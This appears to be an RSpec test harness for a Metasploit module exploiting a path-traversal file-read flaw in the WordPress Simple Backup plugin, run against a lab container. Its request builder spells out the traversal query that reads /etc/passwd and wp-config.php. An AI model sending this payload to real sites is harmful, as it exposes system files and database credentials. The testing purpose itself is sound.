# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'uri'
require_relative 'profiles'

RSpec.shared_context 'native Simple Backup target' do
  include_context 'module target'

  before(:all) do
    @simple_backup_profile = SimpleBackupProfiles.fetch
    @simple_backup_native = { requests: [], commands: [], calls: [] }
    begin
      simple_backup_counters('before')
      if @simple_backup_profile.fetch('mode') == 'unrelated'
        response = simple_backup_request('/')
        expect(response.code).to eq('200')
        expect(response.body).to include('module-target-http-marker')
      else
        @simple_backup_baseline = simple_backup_identity
        expect(@simple_backup_baseline.slice('core', 'php', 'uid')).to eq(SimpleBackupProfiles::RUNTIME)
        expect(@simple_backup_baseline.values_at('sapi', 'prefix')).to eq(['cli', @simple_backup_profile.fetch('prefix')])
        expect(@simple_backup_baseline.fetch('active')).to eq(!@simple_backup_profile.fetch('release').nil?)
        expect(@simple_backup_baseline.fetch('plugin_version')).to eq(@simple_backup_profile.fetch('release'))
        expect(simple_backup_request("#{simple_backup_prefix}/wp-login.php").body).to include('name="log"', 'name="pwd"')
        if @simple_backup_profile.fetch('release')
          release = SimpleBackupProfiles::RELEASES.fetch(@simple_backup_profile.fetch('release'))
          expect(@simple_backup_baseline.slice('archive_sha256', 'endpoint_sha256')).to eq(release.slice('endpoint_sha256').merge('archive_sha256' => release.fetch('sha256')))
          expect(@simple_backup_baseline.fetch('active_plugins')).to eq(['simple-backup/simple-backup-loader.php'])
          expect(simple_backup_request("#{simple_backup_prefix}/wp-content/plugins/simple-backup/readme.txt").body).to include("Stable tag: #{@simple_backup_profile.fetch('release')}")
          SimpleBackupProfiles::FILES.each_value do |fixture|
            path = fixture.fetch('path')
            actual = @simple_backup_baseline.fetch('files').fetch(path)
            expect(actual.values_at('exists', 'readable')).to eq([true, true]) unless fixture == SimpleBackupProfiles::FILES.fetch('missing')
            response = simple_backup_file_request(path)
            expect(response.code).to eq('200')
            if @simple_backup_profile.fetch('mode') == 'affected'
              expected = actual.fetch('exists') ? Base64.strict_decode64(actual.fetch('content_base64')) : ''.b
              expect(Digest::SHA256.hexdigest(response.body.to_s.b)).to eq(Digest::SHA256.hexdigest(expected))
            else
              expect(response.body).to eq('Access Denied!')
            end
          end
          expect(@simple_backup_baseline.fetch('endpoint_exists')).to be(true)
          if @simple_backup_profile.fetch('mode') == 'affected'
            expect(simple_backup_file_request('/etc/passwd', depth: 1).body.to_s).to eq('')
            config = @simple_backup_baseline.fetch('config_path')
            expect(Digest::SHA256.hexdigest(simple_backup_file_request('wp-config.php', depth: 1).body.to_s.b)).to eq(@simple_backup_baseline.fetch('files').fetch(config).fetch('sha256'))
          end
          backup = @simple_backup_baseline.fetch('backup_path')
          expect(Digest::SHA256.hexdigest(simple_backup_file_request('module-target-backup.txt', depth: 0).body.to_s.b)).to eq(@simple_backup_baseline.fetch('files').fetch(backup).fetch('sha256'))
          rewritten = simple_backup_file_request('/etc/passwd', base_path: "#{simple_backup_prefix}/module-target-missing")
          expect(rewritten.code).to eq('200')
          expected = @simple_backup_profile.fetch('mode') == 'affected' ? @simple_backup_baseline.fetch('files').fetch('/etc/passwd').fetch('sha256') : Digest::SHA256.hexdigest('Access Denied!')
          expect(Digest::SHA256.hexdigest(rewritten.body.to_s.b)).to eq(expected)
        else
          expect(@simple_backup_baseline.fetch('active_plugins')).to eq([])
          expect(simple_backup_request('/wp-content/plugins/simple-backup/readme.txt').code).to eq('404')
          denied = simple_backup_file_request('/etc/passwd')
          expect(denied.code).to eq('302')
          expect(denied['location']).to include('wp-login.php')
        end
        expect(simple_backup_identity).to eq(@simple_backup_baseline)
      end
      provenance = console_command('irb -e \'puts "SIMPLE_BACKUP_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/scanner/http/wp_simple_backup_file_read.rb").hexdigest}.to_json\'')
      values = JSON.parse(provenance.match(/^SIMPLE_BACKUP_PROVENANCE=(.+)$/)[1])
      expect(values.fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(values.fetch('owner_sha256')).to eq(Digest::SHA256.file('modules/auxiliary/scanner/http/wp_simple_backup_file_read.rb').hexdigest)
      @simple_backup_native[:provenance] = values
      @simple_backup_native[:preflight] = 'passed'
    ensure
      simple_backup_save
    end
  end

  after(:all) do
    expect(simple_backup_identity).to eq(@simple_backup_baseline) if @simple_backup_baseline
    expect(console_command('irb -e \'puts "SIMPLE_BACKUP_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('SIMPLE_BACKUP_STATE={"sessions":[],"jobs":[]}')
  ensure
    simple_backup_counters('after')
    simple_backup_save
  end

  def simple_backup_prefix
    @simple_backup_profile.fetch('prefix')
  end

  def simple_backup_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-simple_backup.json'), JSON.pretty_generate(@simple_backup_native)) if @simple_backup_native
  end

  def simple_backup_identity
    argv = target_runtime.fetch('compose') + ['exec', '-T', '--user', 'www-data', 'app', 'timeout', '20', 'php', '/opt/module-target/control.php']
    output, error, status = Open3.capture3(*argv)
    @simple_backup_native.fetch(:commands) << { argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exitstatus: status.exitstatus }
    simple_backup_save
    raise "Native Simple Backup inspection failed: #{error}" unless status.success?

    JSON.parse(output)
  end

  def simple_backup_request(path)
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    response = http.request(Net::HTTP::Get.new(path))
    @simple_backup_native.fetch(:requests) << { path: path, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    simple_backup_save
    response
  end

  def simple_backup_file_request(path, depth: @simple_backup_profile.fetch('depth'), base_path: simple_backup_prefix)
    query = URI.encode_www_form('page' => 'backup_manager', 'download_backup_file' => ('../' * depth) + path.delete_prefix('/'))
    simple_backup_request("#{base_path}/wp-admin/tools.php?#{query}")
  end

  def simple_backup_loots
    Dir[File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot', '*')].select { |path| File.file?(path) }
  end

  def simple_backup_owner(options = {}, action: 'run')
    output = run_target_module(SimpleBackupProfiles::OWNER, 'app', {
      'SSL' => false, 'TARGETURI' => "#{simple_backup_prefix}/", 'DEPTH' => @simple_backup_profile.fetch('depth'), 'THREADS' => 1, 'HttpClientTimeout' => 5
    }.merge(options), action: action, allow_errors: true)
    @simple_backup_native.fetch(:calls) << { action: action, options: options, output_base64: Base64.strict_encode64(output.b) }
    simple_backup_save
    output
  end

  def simple_backup_download(path, options = {})
    before = simple_backup_loots
    output = simple_backup_owner({ 'FILEPATH' => path }.merge(options))
    loots = simple_backup_loots - before
    expect(loots.length).to eq(1), output.dup.force_encoding(Encoding::UTF_8).scrub
    actual_path = case path
                  when 'wp-config.php' then @simple_backup_baseline.fetch('config_path')
                  when 'module-target-backup.txt' then @simple_backup_baseline.fetch('backup_path')
                  else '/' + path.delete_prefix('/')
                  end
    expected = @simple_backup_baseline.fetch('files').fetch(actual_path)
    expect([File.size(loots.first), Digest::SHA256.file(loots.first).hexdigest]).to eq(expected.values_at('size', 'sha256'))
    expect(output).to include('File saved in:')
    expect(output.b).to include(loots.first.b)
  end

  def simple_backup_refuse(options = {}, action: 'run')
    before = simple_backup_loots
    output = simple_backup_owner(options, action: action)
    expect(simple_backup_loots).to eq(before)
    expect(output).not_to include('File saved in:')
    expect(output).not_to include('This module does not support check.') if action == 'check'
    output
  end

  def simple_backup_counters(phase)
    roles = @simple_backup_profile.fetch('mode') == 'unrelated' ? ['app'] : %w[app db]
    values = roles.to_h do |role|
      counters = %w[memory.events pids.events].to_h do |name|
        numbers = target_exec(role, 'cat', "/sys/fs/cgroup/#{name}").lines.to_h do |line|
          key, value = line.split
          [key, Integer(value, 10)]
        end
        [name, numbers]
      end
      [role, counters]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), "simple_backup-resources-#{phase}.json"), JSON.pretty_generate(values))
    values.each_value do |counters|
      expect(counters.fetch('memory.events').values_at('oom', 'oom_kill')).to eq([0, 0])
      expect(counters.fetch('pids.events').fetch('max')).to eq(0)
    end
  end
end
